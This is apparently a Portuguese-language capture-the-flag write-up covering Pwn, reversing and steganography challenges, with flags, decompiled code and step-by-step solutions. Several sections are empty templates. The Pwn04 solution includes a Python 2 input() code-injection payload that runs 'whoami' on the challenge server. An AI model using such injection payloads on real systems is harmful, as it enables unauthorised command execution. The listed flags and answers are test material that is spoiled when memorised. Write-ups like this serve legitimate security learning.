Observando o conteúdo de carta.txt, notamos que há vários caracteres em desordem. Mas se colocarmos nossos neurônios para pensar, podemos lembrar de um interpretador de uma linguagem muito conhecida por ser extremamente complexa, a linguagem esotérica famosa por sua complexidade é a **Malbolge**. Através de um [site](https://malbolge.doleczek.pl/) de interpretação de códigos Malbolge, conseguimos decodificar a mensagem:

<img src="images/Pasted image 20230827151107.png">

## Onion Services (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Publicidade de Limpeza (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Pwn

## Pwn01 (10)
### Descrição
nc 45.63.104.42 2331

### Arquivos anexados
pwn01.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
  
char buf[32];
  
int main()
{
        int fd;
        int len = 0;
        int num;
        scanf("%d", &num);
        fd = num - 0xcafe;
        len = read(fd, buf, 32);
        if(!strcmp("ALQUYMIA\n", buf))
        {
                printf("Parabens, pegue sua flag: ");
                printf("ALQ{?}\n");
        }
        return 0;
  
}
```

### Flag
```
ALQ{f1l3_d3script0r_654}
```
### Solução detalhada
Ao analisar o código C, podemos observar a presença da função ```scanf``` onde permite o usuário a preencher um campo com algum número inteiro.
```
scanf("%d", &num);
```
Na linha seguinte, o valor da variável ```fd``` será ```num - 0xcafe```, essa variável será usada no primeiro argumento da próxima função, chamada ```read```.

Estrutura da função read:
```
ssize_t read(int fd, void buf[.count], size_t count);
```

A imagem a seguir mostra algumas informações sobre file descriptor:

<img src="images/Pasted image 20230827122505.png">

Com base nessa analise, precisamos fazer com que o valor da variável ```fd``` seja igual a 0, que interpretado pelo binário, será o "Standard Input", conhecido como "stdin".

```
0 = X - 0xcafe
```

Podemos usar a linguagem de programação Python para descobrirmos o número inteiro por trás de ```0xcafe```.
```
$ python3 -c "print(0xcafe)"
51966
```

Agora que temos o número, conseguiremos resolver a simples conta de matemática:
```
0 = X - 0xcafe
0 = X - 51966
0 = 51966 - 51966
```

A próxima linha do código usa a função strcmp para comparar se o usuário preencheu o campo com a palavra "ALQUYMIA".
```
if(!strcmp("ALQUYMIA\n", buf))
```

Agora o que precisamos fazer é se conectar com o servidor e enviar o número para que seja interpretado como file descriptor stdin e enviar a palavra "ALQUYMIA" para retornar a flag:

<img src="images/Pasted image 20230827131846.png">

## Pwn02 (10)
### Descrição
nc 45.63.104.42 3442

### Arquivos anexados
pwn02.c
```
#include <stdio.h>
#include <stdlib.h>

int main()
{
        long int passw;
        long int passw_ = 0x9999dead9999;
        scanf("%ld", &passw);
        if(passw == passw_)
        {
                printf("Parabens, pegue sua flag: ");
                printf("ALQ{?}\n");
        }
        return 0;
}
```

### Flag
```
ALQ{3ntend3ndo_hex4d3cima1s_3}
```
### Solução detalhada
Analisando o código C, percebemos que há uma variável inteiro longo chamado "passw_" com o valor "0x9999dead9999". Na linha seguinte, existe a função "scanf" onde irá armazenar um valor inteiro longo que o usuário enviar. Posteriormente esses dois valores será comparados, e se for iguais, a flag será retornada.

O valor da variável "passw_" lembra um valor hexadecimal, portanto, podemos usar a linguagem de programação Python para decodificar esse valor.

```
python3 -c "print(0x9999dead9999)"
168886144965017
```

Agora precisamos apenas se conectar ao servidor e enviar o valor decodificado.

<img src="images/Pasted image 20230827131818.png">

## Pwn03 (25)
### Descrição
nc 45.63.104.42 7213

### Arquivos anexados
pwn03
### Flag
```
ALQ{b4sic_r3verse_21}
```
### Solução detalhada
Para esse desafio, foi usado a ferramenta de engenharia reversa Ghidra para obter o código da ```int main()``` e foram feitos algumas modificações para obter um melhor entendimento sobre o código do binário:

```

int main(void)

{
  int result;
  size_t tamanhoUserInput;
  char userinput [34];
  char valorParaComparar [13];
  char local_19;
  undefined4 uStack_18;
  undefined3 uStack_14;
  undefined5 uStack_11;
  int i;
  
  local_19 = 'C';
  uStack_18 = 0x5443534e;
  uStack_14 = 0x434a4d;
  uStack_11 = 0x393535334f;
  fgets(userinput,32,stdin);
  tamanhoUserInput = strcspn(userinput,"\n");
  userinput[tamanhoUserInput] = '\0';
  for (i = 0; i < 13; i = i + 1) {
    valorParaComparar[i] = (&local_19)[i] + -2;
  }
  local_19 = '\0';
  result = strcmp(userinput,valorParaComparar);
  if (result == 0) {
    puts("Pegue sua flag: ALQ{?}");
  }
  else {
    puts("Errouuuuuu!!");
  }
  return 0;
}
```

Observando as variáveis, encontrados alguns valores dentro de ```local_19```, ```uStack_18```, ```uStack_14```, e ```uStack_11```. Para decifrar os valores de ```uStack_1*```, usamos a ferramenta CyberChef seguindo a seguinte receita:

<img src="images/Pasted image 20230827130558.png">

Valores:
```
0x5443534e
0x434a4d
0x393535334f
```

Após decodificar e reverter os valores, o resultado foi ```NSCTMJCO3559```, porém precisava adicionar a letra "C" no início do valor, o que resultou em ```CNSCTMJCO3559```.

Analisando o seguinte comportamento do binário, observamos que ele pegava cada letra e número da variável ```local_19``` (que seria ```CNSCTMJCO3559```) e voltava duas casas atrás, ou seja, C = A, N = L, e S = Q.
```
for (i = 0; i < 13; i = i + 1) {
    valorParaComparar[i] = (&local_19)[i] + -2;
}
```

Observando esse comportamento, remodelamos o valor de ```CNSCTMJCO3559``` para ```ALQARKHAM1337```. Com esse valor, conectamos ao servidor e enviamos ele.

<img src="images/Pasted image 20230827131735.png">

## Oculto.exe (50)
### Descrição
Arkham começou novamente suas brincadeiras de esconder as coisas, mas dessa vez ele se superou, conseguiu até esconder algumas funções importantes do C. Será que você será capaz de visualizar a flag escondida?

### Arquivos anexados
oculto.exe
### Flag
```
ALQ{3nxergand0_o_0culto}
```
### Solução detalhada
Para esse desafio, foi usado a ferramenta de engenharia reversa Ghidra para encontrar a função escondida do binário.

<img src="images/Pasted image 20230827133448.png">

Encontramos alguns valores nas variáveis ```uStack_*``` e a seguinte instrução:

```
for (iStack_c = 0; iStack_c < 0x17; iStack_c = iStack_c + 1) {
    acStack_48[iStack_c] = *(char *)((longlong)&uStack_28 + (longlong)iStack_c) + -3;
}
```

Observando a instrução, podemos concluir que é parecida com as instruções do desafio "Pwn03", porém, ao invés de voltar duas casas, ele volta três. A mesma receita usada no desafio anterior é a mesma usada no oculto.exe.

<img src="images/Pasted image 20230827134232.png">

Transformamos isso:
```
0x687b71367e544f44
0x7262336771646a75
0x78663362
0x776f
0x72
0x7d
```

Para isso:
```
DOT~6q{h
ujdqg3br
b3fx
ow
r
}
```

Que por final virou ```DOT~6q{hujdqg3brb3fxowr}```.

Seguindo a regra de voltar três casas e ajustando algumas caracteres, o resultado final foi igual a ```ALQ{3nxergand0_o_0culto}```.

## Pwn04 (50)
### Descrição
nc 45.63.104.42 4553

### Arquivos anexados
programa.py

```
senha = input("")

if senha == numero: # a senha é composta por apenas numeros
    print "Pegue sua flag: ALQ{?}"
else:
    print "Errouuuu!!!!"
```
### Flag
```
ALQ{3val_c0m_python_2}
```
### Solução detalhada
Ao analisar o código Python, a principio não parece ter alguma vulnerabilidade, mas na versão 2 do Python, a função ```input``` era considerada perigosa por ser igualmente a função ```eval```. Por esse motivo muitos códigos Python 2 usavam a função ```raw_input``` ao invés de ```input```.

Pesquisando mais afundo sobre a fraqueza, é possível encontrar payloads que podem ser usados para explorar essa falha. Utilizamos o seguinte payload para detectar:

```
__import__("os").system("whoami")
```

Nos conectamos ao servidor e enviamos.

<img src="images/Pasted image 20230827135821.png">

<img src="images/Pasted image 20230827135846.png">

A flag foi encontrada no caminho ```/srv/pwn05/flag.txt```.

<img src="images/Pasted image 20230827135940.png">

# Stego

## Descoberta Histórica (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Quase Igual (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Vaso de decoração (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Fake Story (50)
### Descrição

<img src="images/Pasted image 20230827100005.png">

### Solução detalhada

É nos dada uma imagem para analisar, primeiramente, rodo o TweakPNG para verificar

<img src="images/Pasted image 20230827101530.png">

Vários erros aparecem, depois de muita busca, concertando o IHDR e tentando concertar os IDAT's na mão, percebi que na verdade era super simples, o problema residia no tamanho da imagem.

Usando o próprio TweakPNG, troque o tamanho da imagem para 1024x1024.

<img src="images/Pasted image 20230827101634.png">

Depois disso, Salve a imagem e a abra denovo,

E olha só, obtemos a imagem original concertada.
Analisando atentamente, aparentemente tem um qrcode escondido na imagem.
<img src="images/Pasted image 20230827101736.png">

Agora com a imagem concertada, usaremos o StegSolve para tentar pegar o qrcode.

<img src="images/Pasted image 20230827102153.png">

Use a setinha no canto inferior, e boom

<img src="images/Pasted image 20230827102320.png">

<img src="images/Pasted image 20230827102437.png">

Flag: https://ALQ{imagem_0cult@}

## Na Deepweb 2 (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Tinta Invisível (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## A Animação (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## O lado oculto da lua (100)
### Cernan: Whooooooooooooo. Young: Você também ouviu aquele som de assobio? Cernan: Sim. Soa como – você sabe, música do tipo espaço sideral. Young: Eu me pergunto o que é.

### Transcrição da NASA

### ALQ{stegonaut@}

### Solução detalhada

Essa challenge consistia em procurar no google sobre o lado oculto da lua (missão), e descobrir em qual apollo ela fez parte que é a apollo10, que seria a key.

Existe um site online de stego em audio chamado "stegonaut", e nela podemos colocar a key e extrair a flag.

<img src="images/oculto.png">
<img src="images/glua.png">
<img src="images/stegonaut.png">
<img src="images/steg.png">
<img src="images/flagaudio.png">

## Arte (150)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada
